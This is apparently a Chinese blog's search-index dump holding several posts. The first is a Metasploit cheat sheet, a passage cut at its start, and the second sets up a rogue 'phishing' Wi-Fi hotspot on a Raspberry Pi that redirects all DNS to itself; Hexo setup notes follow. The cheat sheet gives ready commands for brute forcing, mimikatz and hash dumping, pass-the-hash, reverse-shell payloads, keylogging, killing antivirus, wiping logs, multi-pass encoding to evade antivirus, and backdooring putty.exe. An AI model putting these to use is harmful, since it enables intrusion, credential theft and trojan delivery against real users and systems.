/pentest/exploits/fasttrack/bin/dict/wordlist.txt \n     set RHOSTS 192.168.1.130 \n     set THREADS 10 \n     set verbose false \n     exploit \n     ```\n\n  3. sa权限对其利用\n     ```\n     use admin/mssql/mssql_exec\n     set rhost 192.168.2.10\n     set password sa\n     set CMD cmd.exe /c echo hello\n     exploit\n     ```\n     \n  4. 使用MSSQL自带的 `xp_cmdshell` 添加账户\n     ```\n     msf> use exploit/windows/mssql/mssql_payload \n     show options \n     set payload windows/meterpreter/reverse_tcp \n     set LHOST 192.168.1.111 \n     set LPORT 433 \n     set RHOST 192.168.1.130 \n     set PASSWORD password130 \n     exploit \n     ```\n\n- MySQL开放利用\n\n  ```\n  待完善\n  ```\n\n  ​\n\n- 爆破ssh模块\n\n  ```\n  use auxiliary/scanner/ssh/ssh_login\n  set rhosts 7.7.7.20\n  set username root\n  set pass_file /root/pass.txt //加载字典，可以收集密码做字典\n  set threads 50\n  run\n  ```\n\n- 通过nmap扫描基本漏洞\n\n  ```\n  msf > nmap –script=vuln 受害靶机ip地址\n  msf > nmap –script=mysql-info 192.168.0.4 //扫描mysql数据库信息 版本 等..\n  ```\n\n###清除痕迹\n\n```\nmsf > clearev //删除目标机上的应用程序、系统和安全日志。\n```\n\n\n\n### 读取系统账号密码\n\n- 加载mimikatz\n\n    ```\n    meterpreter > load mimikatz //加载mimikatz模块\n    meterpreter > wdigest //需要system权限\n    ```\n\n- 读取Hash并使用smb协议登录\n\n  ```\n  meterpreter> use priv \n  meterpreter> run post/windows/gather/hashdump \n  ```\n\n  当获取到密码的hash 之后无法破解出明文密码且无法直接使用hash 登陆，需要使用 `pass-the-hash` 技术： \n\n  ```\n  msf> use windows/smb/psexec \n  set PAYLOAD windows/meterpreter/reverse_tcp \n  set LHOST 192.168.1.111 \n  set LPORT 443 \n  set RHOST 192.168.1.130 \n  set SMBPass aad3b435b51404eeaad3b435b51404ee:b75989f65d1e04af7625ed712ac36c29 \n  exploit \n  ```\n\n  获取到系统权限后我们可以新建一个普通账号，然后使用此账号执行我们的后门： \n  在目标机器上执行：\n\n  ```\n  net user hacker p@ssw0rd /add\n  ```\n\n  本地生成一个后门程序： \n\n  ```\n  msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.111 LPORT=443 X > payload.exe \n  ```\n\n  将payload.exe 拷贝到目标机器然后使用新建立的账号执行本地执行端口监听，等待来自目标机器连接： \n\n  ```\n  msfcli multi/handler PAYLOAD=windows/meterpreter/reverse_tcp \n  LHOST=192.168.1.111 LPORT=443 \n  use priv \n  getsystem \n  getuid \n  ```\n\n  至此取得SYSTEM 权限\n\n### 键盘记录\n\n```\nmeterpreter> run post/windows/capture/keylog_recorder //运行键盘记录模块，他自己创建本文。\n```\n\n/root/.msf3/loot/*.txt #查看结果 \n\n### 进程权限迁移\n\n当攻击成功后将连接进程从不稳定进程（如使用浏览器溢出漏洞exp 进行攻击时浏览器可能会被目标关闭）迁移至稳定进程(explorer.exe)，保持可连接。\n\n```\nmeterpreter> run post/windows/manage/migrate \n```\n\n在64 位win7 中migrate 需要管理员权限执行后门才能成功，而migrate 前后获取的权限是有差异的。\n\n### 关闭杀毒软件 \n\n```\nmeterpreter> run killav （这个脚本要小心使用，可能导致目标机器蓝屏死机。） \n```\n\n### 获取系统流量\n\n```\nmeterpreter> run packtrecorder –i 1 \n```\n\n### 获取目标网络共享\n\n```\nmeterpreter> run scraper\n```\n\n从目标主机获得所有网络共享等信息。并且获得的这些所有这些信息都存储在 `/root/.msf4/logs/scripts/scraper/directory` 目录下。使用 `ls` 命令查看存储的这些文件。\n\n### VNC远程界面控制\n\n- VNC控制命令\n\n```\nmeterpreter> run vnc \nmeterpreter> run screen_unlock\n```\n\n### Windows API编程 , Hello World弹窗\n\n使用Railgun 操作windows APIs \n\n```\nmeterpreter > irb\n[*] Starting IRB shell\n[*] The 'client' variable holds the meterpreter client\n>> client.railgun.user32.MessageBoxA(0,\"Hello World\",\"Im Title\",\"MB_OK\")\n```\n\n### 编码绕过杀软\n\n```\nmsfencode –l #列出可用编码器 \n```\n\n简单编码：\n\n```\nmsfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=31337 R |msfencode –e x86/shikata_ga_nai –t exe > /var/www/payload2.exe \n```\n\n使用R 参数作为raw 输出至管道，再经过msfencode 处理，最后导出。\n\n多次编码：\n\n```\nmsfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.111 LPORT=31337 R | \nmsfencode –e x86/shikata_ga_nai –c 5 –t raw | msfencode –e x86/alpha_upper –c 2 –t raw | \nmsfencode –e x86/shikata_ga_nai –c 5 –t raw | msfencode –e x86/countdown –c 5 –t exe –o \n/var/www/payload3.exe \n```\n\n简单编码被杀机会很大，使用多次编码效果更好，这里一共使用了17 次循环编码。 \n\n> 题外：\n>\n> 经测试 >>> \n>\n> 1：使用此命令生成的后门也被MSE 杀到；\n>\n> 2：未编码的后门或编码次数较少的后门可以直接被秒杀；\n>\n> 3：windows/x64/meterpreter/reverse_tcp 生成的后门未经任何处理仍然不被杀，看来杀毒软件傻逼了；\n>\n> 4：x86 编码器编码的后门在64 位机器上无法执行；\n>\n> 5：360 有个沙箱功能，后门文件右键选择“在360 隔离沙箱中运行”，msf照样可以连接并操作，看来隔离沙箱功能有限。）\n\n### 自定义可执行程序模板\n\nmsfencode 默认使用data/templates/templates.exe（msf v4 在templates 目录下有针对不同 \n平台的不同模板）作为可执行程序的模板，杀毒厂商也不是傻逼，所以这里最好使用自定义模板，如： \n\n```\nwget <http://download.sysinternals.com/Files/ProcessExplorer.zip> \ncd work \nunzip ProcessExplorer.zip \ncd .. \nmsfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8080 R | msfencode \n–t exe –x work/procexp.exe –o /var/www/pe_backdoor.exe –e x86/shikata_ga_nai –c 5 \n```\n\n在目标机器上运行，然后本地使用msfcli 监听端口等待反弹连接： \n\n```\nmsfcli exploit/multi/handler PAYLOAD=windows/shell_reverse_tcp LHOST=192.168.1.111 \nLPORT=8080 E\n```\n\n### 暗度陈仓—猥琐执行payload (绑定到可执行文件)\n\n绑定payload 至一个可执行文件，让目标不知不觉间中招，以putty.exe 为例： \n\n```\nmsfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8080 R | msfencode \n–t exe –x putty.exe -o /var/www/putty_backdoor.exe –e x86/shikata_ga_nai –k –c 5\n```\n\n假如选择一个GUI 界面的程序作为绑定目标并且不使用-k 选项，则目标执行此程序的时候不会弹出cmd 窗口，-k 选项的作用是payload 独立于模板软件的进程运行。\n\n### MetaSploit 创建工作空间\n\n很多时候，你要在不同的环境下，渗透不同的目标，这个时候 hosts中的IP会很乱，你就需要工作空间来区分开你每次不同的渗透环境中的操作与存储，来说说Metasploit中的 `workspace` \n\n```\nmsf > workspace -h\nUsage:\n    workspace                  List workspaces\n    workspace -v               List workspaces verbosely\n    workspace [name]           Switch workspace\n    workspace -a [name] ...    Add workspace(s)\n    workspace -d [name] ...    Delete workspace(s)\n    workspace -D               Delete all workspaces\n    workspace -r <old> <new>   Rename workspace\n    workspace -h               Show this help information\n\n```\n\n比较常用的命令：\n\n添加工作空间\n\n```\nmsf > workspace -a imworkspaceone\n[*] Added imworkspaceone\nmsf >\n```\n\n选择工作空间\n\n```\nmsf > workspace imworkspaceone \n[*] Workspace: imworkspaceone\n```\n\n删除工作空间\n\n```\nmsf > workspace -d imworkspaceone\n[*] Deleted workspace: imworkspaceone\n[*] Switched workspace: default\nmsf > \n```\n\n操作多个工作空间来分离渗透操作与数据。\n\n### 使用 Hosts 中的IP定向渗透\n\n当你选择好了你的攻击模块的时候 ，想要将 `RHOSTS` 中的IP列表设置为`Hosts`中的IP（这里你需要Hosts中有IP才行，可以选中用 `db_import` 导入，也可以用 `db_nmap` 扫描获取）\n\n首先配置你的攻击模块，然后 `show options` 查看需要配置目标的配置项是RHOSTS还是RHOST，当需要设置RHOSTS的时候 `hosts -c address -R` 就将hosts中所有IP地址的列表传送给了RHOSTS，执行run 向metasploit发送执行命令。\n\n以下是一个例子：\n\n```\nmsf > use auxiliary/scanner/portscan/tcp\nmsf auxiliary(scanner/portscan/tcp) > show options \n\nModule options (auxiliary/scanner/portscan/tcp):\n\n   Name         Current Setting  Required  Description\n   ----         ---------------  --------  -----------\n   CONCURRENCY  10               yes       The number of concurrent ports to check per host\n   DELAY        0                yes       The delay between connections, per thread, in milliseconds\n   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.\n   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)\n   RHOSTS                        yes       The target address range or CIDR identifier\n   THREADS      1                yes       The number of concurrent threads\n   TIMEOUT      1000             yes       The socket connect timeout in milliseconds\n\nmsf auxiliary(scanner/portscan/tcp) > hosts -c address -R\n\nHosts\n=====\n\naddress\n-------\n10.12.103.171\n10.12.103.172\n10.12.103.173\n10.12.103.174\n10.12.103.191\n10.12.103.192\n...\n...\n...\n...\n10.14.80.212\n10.14.80.213\n10.14.80.214\n10.14.80.215\n10.14.80.216\n\nRHOSTS => file:/var/folders/0n/78ntbx595w3fll8tn5gk4t3c0000gn/T/msf-db-rhosts-20180412-7048-17nfta1\n\nmsf auxiliary(scanner/portscan/tcp) > run\n\n[+] 10.12.103.171:        - 10.12.103.171:22 - TCP OPEN\n[+] 10.12.103.171:        - 10.12.103.171:80 - TCP OPEN\n[+] 10.12.103.171:        - 10.12.103.171:111 - TCP OPEN\n...\n...\n```\n\n\n\n\n\n## 常用渗透手段\n\n### 扫描匿名FTP\n\n```\nuse auxiliary/scanner/ftp/anonymos \nset RHOSTS 192.168.1.0/24 \nset THREADS 50 \nrun \n```\n\n### 与nessus 结合扫描\n\n使用Nessus 扫描完成后生成.nessus 格式的报告，导入到MSF： \n\n```\ndb_connect postgres:toor@127.0.0.1/msf \ndb_import /tmp/nessus_report_Host_test.nessus \ndb_hosts –c address,svcs,vulns \ndb_vulns \n```\n\n在MSF 中使用Nessus： \n\n```\ndb_connect postgres:toor@127.0.0.1/msf \nload nessus \nnessus_connect nessus:toor@192.168.1.111:8834 ok \nnessus_policy_list #查看存在的扫描规则 \nnessus_scan_new 2 bridge_scan 192.168.1.111 #2 表示规则的ID 号，bridge_scan 自定义扫描名称 \nnessus_scan_status #查看扫描进行状态 \nnessus_report_list #查看扫描结果 \nnessus_report_get skjla243-3b5d-* #导入报告 \ndb_hosts –c address,svcs,vulns\n```\n\n### SMB弱口令扫描\n\n```\nmsf> use auxiliary/scanner/smb/smb_login \nset RHOSTS 192.168.1.111-222 \nset SMBUser Administrator \nset SMBPass admin \nrun \n```\n\n### VNC空口令扫描\n\n```\nmsf> use auxiliary/scanner/vnc/vnc_none_auth \nset RHOSTS 192.168.1.111 \nrun \n```\n\n### Open X11空口令\n\n```\nmsf> use auxiliary/scanner/x11/open_x11 \nset RHOST 192.168.1.0/24 \nset THREADS 50 \nrun \n```\n\n### Msf自动化测试(一行命令执行)\n\n为了缩短渗透测试的时间可以将 `Msf` 命令写入一个文件，然后使用 `msfconsole` 加载执行。\n\n加载方式：msfconsole 的resource 命令或者msfconsole 加上-r 选项 \n\n例如：\n\n```\necho ‘version’ > resource.rc \necho ‘load sounds’ >> resource.rc \nmsfconsole –r resource.rc \n```\n\n例如：\n\n```\necho ‘use exploit/windows/smb/ms08_067_netapi’ > autoexp.rc \necho ‘set RHOST 192.168.1.133’ >> autoexp.rc \necho ‘set PAYLOAD windows/meterpreter/reverse_tcp’ >> autoexp.rc \necho ‘set LHOST 192.168.1.111’ >> autoexp.rc \necho ‘exploit’ >> autoexp.rc \nmsfconsole \nmsf> resource autoexp.rc\n```\n\n","tags":["MetaSploit"],"categories":["MetaSploit 笔记"]},{"title":"树莓派创建钓鱼WiFi实战全过程","url":"%2F2018%2F02%2F23%2F%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%9B%E5%BB%BA%E9%92%93%E9%B1%BCWiFi%E5%AE%9E%E6%88%98%E5%85%A8%E8%BF%87%E7%A8%8B%2F","content":"\n\n\n\n###  测试环境\n\n-  攻击机：树莓派3代 B   `kali 2.0 armhf`\n\n  \t- 免驱无线网卡\n\n-  受害机：MacBook  `MacOS Sierra 10.12.6`\n\n  ​\n\n### 环境搭建\n\n####安装必要工具\n\n```bash\nsudo apt-get install hostapd dnsmasq\n```\n\n安装 `nodejs` , 你可以直接执行\n\n```bash\nsudo apt-get install nodejs\n```\n\n>当安装上面命令安装失败时尝试下面方法：\n>\n>访问 [官方下载页面](https://nodejs.org/en/download/) ，找到Source Code源码包[下载地址](https://nodejs.org/dist/v8.9.4/node-v8.9.4.tar.gz)\n>\n>依次执行进行 下载、解包、编译、安装。\n>\n>```bash\n>wget https://nodejs.org/dist/v8.9.4/node-v8.9.4.tar.gz\n>tar zxvf node-v8.9.4.tar.gz\n>cd node-v9.6.1\n>./configure\n>make\n>make install \n>```\n\n下载 `Closurether` 神器\n\n```bash\ngit clone https://github.com/LFODER/closurether.git\n```\n\n通过 `git` 克隆到本地，开始运行\n\n** 这里还要安装一个神器 `Closurether` **  未完待续\n\n\n\n#### 修改 `hostapd` 配置文件\n\n安装好后，分别来修改配置文件，首先修改 `hostapd`的配置文件\n\n```bash\nsudo vim /etc/hostapd/hostapd.conf\n```\n\n查找并修改以下内容：\n\n```shell\n# 你即将建立热点的无线网卡名字  可以用 ifconfig 或者 iw list 查看\ninterface=wlan1\n# 无线网卡驱动\ndriver=nl80211\n# 热点名字\nssid=RaspberryPi\nhw_mode=g\nchannel=11\n# auth_alg 设置为1 表示开放网络 具体你可以选择 百度一下这个字段\nauth_alg=1\nwmm_enabled=0\n```\n\n当然你也可以设置 **加密** 的WiFi热点，具体配置方法，请 [参考这里](https://www.jianshu.com/p/1fca72a710d5) 。\n\n#### 修改 `dnsmasq` 配置文件\n\n接下来修改 `dnsmasq` 的配置：\n\n```bash\nsudo vim /etc/dnsmasq.conf\n```\n\n找到修改或添加以下内容:\n\n```shell\n# 你即将建立热点的无线网卡名字 可以用 ifconfig 或 iw list 查看\ninterface=wlan1\n# DNS\nlisten-address=192.168.22.1\nbind-interface\n# 设置你的热点可分配IP范围和租用周期。\ndhcp-range=192.168.22.2,192.168.22.254,12h\n# 设置子网掩码\ndhcp-option=1,255.255.255.0\n# 3是网关  6具体是什么意思 忘记了  我只记得又一个是DNS配置 具体需要查阅资料\ndhcp-option=3,192.168.22.1\ndhcp-option=6,192.168.22.1\n# 所有连接上热点的客户端 所有流量全解析到 192.168.22.1  \naddress=/#/192.168.22.1\n\n```\n\n关于 `dnsmasq` 相关推荐：\n\n- [通过Dnsmasq自建干净的DNS服务](https://biji.io/2017/4738.html)\n- [DNS非标准端口设置问题](https://www.v2ex.com/t/253201)\n\n\n\n设置 IPv4 转发\n\n设置 IPv4 转发，通过修改文件配置来打开 IPv4 转发。\n\n```bash\nsudo vim /etc/sysctl.conf\n```\n\n找到 `net.ipv4.ip_forward=1`，去掉注释符号，使其生效。\n\n但是这样设置，需要在下次重启后才会生效，如果不想重启直接执行下面命令即可：\n\n```bash\nsudo sh -c \"echo 1 >/proc/sys/net/ipv4/ip_forward\"\n```\n\n#### 修改防火墙设置\n\n我这里是将以太网 `eth0` 接口共享给树莓派外接网卡 `wlan1` 接口上网，需要配置NAT，需要先对防火墙进行操作：\n\n```bash\nsudo iptables -t nat -APOSTROUTING -o eth0 -j MASQUERADE\nsudo iptables -A FORWARD -i eth0 -o wlan1 -m state --state RELATED,ESTABLISHED -j ACCEPT\nsudo iptables -A FORWARD -i wlan1 -o eth0 -j ACCEPT\n```\n\n当然如果不想每次都设置，可以使用以下命令设置为开机自启动：\n\n```bash\nsudo sh -c \"iptables-save> /etc/iptables.ipv4.nat\"\n```\n\n### 启动钓鱼热点\n\n这里给出一个 `bash`  脚本，作用很简单， 开启和关闭钓鱼热点，保存文件到任何目录\n\n假设你存储的文件名为 `apapap.sh`\n\n```shell\n#! /bin/bash\ncase $1 in\n    \"start\")\n       sleep 1\n       ifconfig wlan1 192.168.22.1 netmask 255.255.255.0  \n       sleep 1\n       echo \"1\" >/proc/sys/net/ipv4/ip_forward\n       sleep 1\n       iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE     \n       sleep 1\n       /etc/init.d/hostapd start\n       sleep 1\n       /etc/init.d/dnsmasq start\n    ;;\n    \"stop\")\n       /etc/init.d/dnsmasq stop\n       /etc/init.d/hostapd stop\n       sleep 1\n       iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE  \n       sleep 1\n       echo \"0\" >/proc/sys/net/ipv4/ip_forward\n       sleep 1\n    ;;\n    *)\n       echo \"Usage $0 {start|stop}\"\n    ;;\n    esac\n```\n\n首先要给文件执行权限：\n\n```bash\nsudo chmod 755 apapap.sh\n```\n\n然后执行\n\n```bash\n./apapap.sh\n```\n\n正常会出现：\n\n```bash\nroot@kali:~# ./apapap.sh \nUsage ./apapap.sh {start|stop}\nroot@kali:~# \n```\n\n用法一目了然，看看正常启动的状态。\n\n```bash\nroot@kali:~# ./apapap.sh start\n[ ok ] Starting hostapd (via systemctl): hostapd.service.\n[ ok ] Starting dnsmasq (via systemctl): dnsmasq.service.\nroot@kali:~# \n```\n\n不出意外的话，执行完成了就是这样，此时你去查看Wifi热点，看是否成功开启了。\n\n![](https://ws1.sinaimg.cn/large/006tNc79gy1foqfkel5jgj30fs0xm40p.jpg)\n\n已经开启了热点，现在连入wifi的所有客户端浏览都经过树莓派网卡。\n\n\n\n一些😈邪恶的玩法 ，请参考这里：http://www.freebuf.com/articles/web/43353.html \n","tags":["中间人劫持"]},{"title":"MacOS安装Metasploit全攻略","url":"%2F2018%2F02%2F22%2FMacOS%E5%AE%89%E8%A3%85Metasploit%E5%85%A8%E6%94%BB%E7%95%A5%2F","content":"\n## 测试环境\n\n- 系 统: `MacOS Sierra 10.12.6`\n\n## 下载MetaSploit官方最新版\n\nMetaSploit Framework 最新版  [下载地址](http://osx.metasploit.com/metasploitframework-latest.pkg)\n\n下载完成，双击安装。此时终端输入 `msfconsole` 提示找不到，是因为环境变量没有设置。\n\n## 添加环境变量\n\n正常的方法是:\n\n```bash\nvim /etc/profile\n```\n\n然后添加\n\n```Bash\nexport PATH=\"/opt/metasploit-framework/bin:$PATH\"\n```\n\n使环境变量立刻生效\n\n```bash\nsource /etc/profile\n```\n\n如果你使用的是 `zsh` 那么则是下面的方法: \n\n```bash\nvim ~/.zshrc\n```\n\n然后添加\n\n```bash\nexport PATH=\"/opt/metasploit-framework/bin:$PATH\"\n```\n\n使环境变量立刻生效\n\n```bash\nsource ~/.zshrc\n```\n\n\n\n## 运行与更新\n\n终端输入 `msf`  并按 `Tab` 键，看是否能出现\n\n```bash\n➜  ~ msf\nmsfbinscan   msfdb        msfpescan    msfrpc       msfvenom                \nmsfconsole   msfelfscan   msfremove    msfrpcd                            \nmsfd         msfmachscan  msfrop       msfupdate   \n```\n\n若出现上面结果，代表环境变量已经生效。\n\n接下来更新Metasploit：\n\n终端执行 `msfupdate`\n\nOK\n\n\n\n## 各种问题和解决方案\n\n### 搜索攻击模块时出现模块换成数据库不能建立，使用慢搜索模式\n\n现象：\n\n```\n [!] Module database cache not built yet, using slow search\n```\n\n解决方案:\n\n```\nmsf > db_rebuild_cache\n```\n\n### 没有连接上数据库\n\n现象：\n\n```\nmsf > db_rebuild_cache \n[-] The database is not connected\nmsf > db_status \n[*] postgresql selected, no connection\n```\n\n解决方案：\n\n```\n\n```\n\n### Postgresql 服务没有启动\n\n现象：\n\n```bash\n➜  ~ msfconsole \n[-] Failed to connect to the database: could not connect to server: Connection refused\n\tIs the server running on host \"127.0.0.1\" and accepting\n\tTCP/IP connections on port 5433?\n```\n\n解决方案：","tags":["MetaSploit"],"categories":["MetaSploit 笔记"]},{"title":"Hexo博客调教笔记","url":"%2F2018%2F02%2F21%2FHexo%E5%8D%9A%E5%AE%A2%E8%B0%83%E6%95%99%E7%AC%94%E8%AE%B0%2F","content":"## Hexo 安装与配置\n### Hexo安装\n> [自行百度](https://www.baidu.com/s?ie=UTF-8&wd=Hexo%E5%AE%89%E8%A3%85) | [官方文档](https://hexo.io/zh-cn/docs/)\n### 测试环境\n> 操作系统: `MacOS Sierra 10.12.6`\n> 博客主题: `next`\n\n### 启动搜索功能\n首先到博客根目录(这里指你 Hexo init 后的博客目录)执行:\n```\nnpm install hexo-generator-search --save\n```\n然后到你的主题目录下修改 `_config.yml` 文件\n我使用的是`Next`主题，进入博客根目录，找到 `themes/next/_config.yml` 文件，搜索 `local_search:`\n会看到如下内容：\n```\n# Local search\n# Dependencies: https://github.com/theme-next/hexo-generator-searchdb\nlocal_search:\n  enable: false\n  # if auto, trigger search by changing input\n  # if manual, trigger search by pressing enter key or search button\n  trigger: auto\n  # show top n results per article, show all results by setting to -1\n  top_n_per_article: 1\n  # unescape html strings to the readable one\n  unescape: false\n```\n将 `enable: false` 改成 `enable: true` 即可启用本地搜索功能。\n然后在 `themes/next/_config.yml` 文件中添加:\n```\n# Search\nsearch:\n  path: search.xml\n  field: post\n  format: html\n  limit: 10000\n```\n### 启用本地图片\n博客中往往会频繁使用到图片，外链图片到博客最简单的方法就是\n```\n!(图片描述 可选)[图片链接]\n```\n但是往往去找一个靠谱的图床是一件很头疼的事情，如果你的服务器带宽够大，可以选择使用本地图片，开启本地图片的方法:\n首先进入博客根目录，编辑 `_config.yml` 文件，找到 `post_asset_folder:false` 修改为 `post_asset_folder:true`\n然后在博客根目录执行 \n```\nnpm install https://github.com/CodeFalling/hexo-asset-image --save\n```\n此时你使用 `hexo new \"一篇博客\"` 的时候，会在博客根目录下 `source/_posts/` 下创建与博客同名的文件夹用于存放本地图片，方便在博客中调用。\n博客调用本地图片时如下:\n```\n![“图片描述”（可以不写）](/文件夹名/你的图片名字.JPG)\n```\n### 插入音乐\n例如网易云，直接获取播放器外链，iframe代码直接写到Blog中即可。\n\n### 启用分类页\n首先执行:\n```\nhexo new page \"categories\"\n```\n新建一个页面为 `categories` 的分类页面，然后会自动在博客根目录下的 `source/_posts/` 生成一个 `categories` 的目录，里面有一个 `index.md`\n打开看看内容如下：\n```\n---\ntitle: \"categories\"\ndate: 2018-02-22 11:44:07\n---\n```\n修改成如下\n```\n---\ntitle: 文章分类\ndate: 2018-02-22 11:44:07\ntype: \"categories\"\ncomments: false\n---\n```\n这里就是需要添加一个 `type` 字段，类型值为 `categories`\n> 如果启用过 `多说` 或者是 `Disqus` 等\b评论插件，默认页面也会带评论，需要关闭则添加 `comments` 字段，并设置值为 `false`\n\n进入博客根目录 ，找到 `themes/next/_config.yml` ，找到主题配置文件，修改其 `menu` 标签。\n```\nmenu:\n  home: / || home\n  tags: /tags/ || tags\n  categories: /categories/ || th\n  archives: /archives/ || archive\n```\n这里把 categories 标签前面的注释  `#` 去掉即可。\n\n### 启用标签页\n\n首先执行:\n```\nhexo new page \"tags\"\n```\n新建一个页面为 `tags` 的标签云页面，然后会自动在博客根目录下的 `source/_posts/` 生成一个 `tags` 的目录，里面有一个 `index.md`\n打开看看内容如下：\n```\n---\ntitle: \"tags\"\ndate: 2018-02-22 11:44:07\n---\n```\n修改成如下\n```\n---\ntitle: 标签云\ndate: 2018-02-22 11:44:07\ntype: \"tags\"\ncomments: false\n---\n```\n这里就是需要添加一个 `type` 字段，类型值为 `tags`\n> 如果启用过 `多说` 或者是 `Disqus` 等\b评论插件，默认页面也会带评论，需要关闭则添加 `comments` 字段，并设置值为 `false`\n\n进入博客根目录 ，找到 `themes/next/_config.yml` ，找到主题配置文件，修改其 `menu` 标签。\n```\nmenu:\n  home: / || home\n  tags: /tags/ || tags\n  categories: /categories/ || th\n  archives: /archives/ || archive\n```\n这里把 tags 标签前面的注释  `#` 去掉即可。\n### 博客中添加标签的方法\n\n在 `source/_posts` 中找到你创建的博客\b，编辑头部内容，格式如下:\n```\n---\ntitle: Hexo博客调教日记\ndate: 2018-02-21 17:16:03\ncategories: \"Hexo教程\"\ntags:\n    - Hexo\n    - Next\ndescription: \b记录自己安装与使用Hexo时踩过的坑与解决方法\n---\n```\n当然 `tags` 标签也可以这么写\n```\n---\n... (此处省略前后文)\ntags: [Hexo,Next]\n...\n---\n```\n`categories` 字段为分类，`description` 字段为描述。\n### 标签删除的方法\n\n理论上在 MD 文件的头部可以删除标签 然后重新生成可以更新 `tags` 标签页\n如果无法成功删除的时候，可以尝试下面的方法:\n删除根目录的 `db.json` 然后 `hexo clean && hexo g`\n\n### 添加RSS\n\n需要安装 `hexo-generator-feed` 插件\n\nRSS还需要一个Feed链接，而这个链接是通过 `hexo-generator-feed`  插件生成的，所以要先安装插件：\n\n```\nnpm install hexo-generator-feed --save\n```\n\n然后去配置 **站点配置文件** 里的Feed信息：\n\n```\nvim _config.yml\n```\n\n找到如下内容：\n\n```\n# 配置RSS\nfeed:\n  type: atom\n  path: atom.xml\n  limit: 20\n  content: 'true'\n```\n\n`feed` 属性下的各个子属性的含义借用feed官方英文解释如下：\n\n- type - Feed type. (atom/rss2)\n- path - Feed path. (Default: atom.xml/rss2.xml)\n- limit - Maximum number of posts in the feed (Use 0 or false to show all posts)\n- hub - URL of the PubSubHubbub hubs (Leave it empty if you don't use it)\n- content - (optional) set to 'true' to include the contents of the entire post in the feed.\n\n### SEO优化\n\n> seo优化对于网站是否能被搜索引擎快速收录有很大帮助，因此适当做一些seo还是有必要的，以下内容参考：<https://lancelot_lewis.coding.me/2016/08/16/blog/Hexo-NexT-SEO/>\n\n#### 添加Sitemap文件\n\n安装以下2个插件，然后重启hexo后，网站根目录（source）下会生成sitemap.xml与baidusitemap.xml文件，搜索引擎在爬取时会参照文件中的url去收录。\n\n```bash\nnpm install hexo-generator-sitemap --save-dev\nhexo d -g\nnpm install hexo-generator-baidu-sitemap --save-dev\nhexo d -g\n```\n\n#### 添加robots.txt\n\n新建robots.txt文件，添加以下文件内容，把robots.txt放在hexo站点的source文件下。\n\n```\nUser-agent: * Allow: /\nAllow: /archives/\nDisallow: /vendors/\nDisallow: /js/\nDisallow: /css/\nDisallow: /fonts/\nDisallow: /vendors/\nSitemap: http://你的博客域名/sitemap.xml\nSitemap: http://你的博客域名/baidusitemap.xml\n```\n\n### 给博客添加评论功能\n\n这里使用Next主题，评论插件使用的是 LiveRe\n\nLiveRe的官网是：[https://livere.com](https://livere.com/)\n\n- 注册livere并获取uid\n\n首先注册，注册这里就不累述了，注册好了点击右上角自己的头像，然后选择 `管理页面`\n\n询问你是否要安装，按照向导一步一步来就好了\n\nLiveRe有两个版本：\n\n1. City 版：是一款适合所有人使用的免费版本；\n2. Premium 版：是一款能够帮助企业实现自动化管理的多功能收费版本。\n\nCity版功能已经够我们使用了。\n\n依次点击右上角头像 => 管理页面 => 代码管理 => 一般网站\n\n会看到一对代码，找到 `data-uid=\"` 后面到双引号之间的一段base64编码过的内容。\n\n复制下来，这个是专属你的用户身份识别uid，然后回到自己的博客目录。\n\n- 为主题配置 livere 插件\n\n进入博客目录 ，找到博客目录下 `themes/next/_config.yml` 主题配置文件，编辑搜索内容关键字`livere_uid: ` 搜索到以后，去掉前面的井号，并且在后面填写你刚才复制的uid，注意 `:` 冒号后面和uid之间有一个空格。\n\n然后就没有然后了 .....\n\n\n\n\n\n## 各种坑和解决方法\n\n### 导航解析错误\n\n> 问题描述:\n\n你发现你写的MD格式都是正常的\b，但是发现Next自动解析的导航，却不合人意，甚至你可以发现正文的代码段混乱什么的情况\n> 解决方法:\n\n找找全文代码段中的用来划分代码段用的三个点末尾是否出现空格，删除之\b，解决。\n\n### ERROR Deployer not found: git\n\n> 问题描述:\n\n在执行\b `hexo d` 的时候，出现 `ERROR Deployer not found: git`错误\n> \b解决方案:\n\n进入博客根目录，执行：\n```\nnpm install  hexo-deployer-git --save\n```\n\n### 关于 Hexo 的 Local Search 失效的问题\n\n> 问题描述:\n\n你会发现一开始你的Blog搜索功能还是正常的，搜索出结果一直在转圈圈等待，或者 搜索功能能搜索但是不能跳转过去，随着添加了几篇文章以后，搜索就不正常了，访问你的博客 `http://你的博客域名/search.xml ` 的时候，提示有存在不可解析的字节的错误，大致如下：\n\n```\nThis page contains the following errors:\n\nerror on line 66 at column 35: Input is not proper UTF-8, indicate encoding !\nBytes: 0x08 0xE8 0xAF 0x84\n\nBelow is a rendering of the page up to the first error.\n```\n\n 此时，是因为你的xml解析有问题，换成json来解析即可，编辑你的站点配置文件 `_config.yml`\n\n找到搜索的地方 把 Search的xml解析改成json解析，具体改完后 如下：\n\n```\nsearch:\n  path: search.json\n  field: post\n  format: html\n  limit: 10000\n```\n\n完美解决搜索问题。\n\n### 解决Hexo Next主题加载太慢的问题\n\n通过网页抓包分析发现加载时间最长的是 `fonts.googleapis.com ` 域名，修改字体请求服务器：\n\n编辑 博客目录下 `themes/next/_config.yml`\n\n```\n# Uri of fonts host. E.g. //fonts.googleapis.com (Default).\n  host: \n```\n\n改成\n\n```\n# Uri of fonts host. E.g. //fonts.googleapis.com (Default).\n  host: //fonts.lug.ustc.edu.cn\n```\n\n","tags":["Hexo"],"categories":["Hexo 笔记"]},{"title":"Hexo改造中… (持续更新) ","url":"%2F2018%2F02%2F02%2FHexo%E6%94%B9%E9%80%A0%E4%B8%AD...%2F","content":"\nvia: https://www.jianshu.com/p/f054333ac9e6\n\nhttps://thief.one/2017/03/03/Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B/\n\n\n\n> Hexo 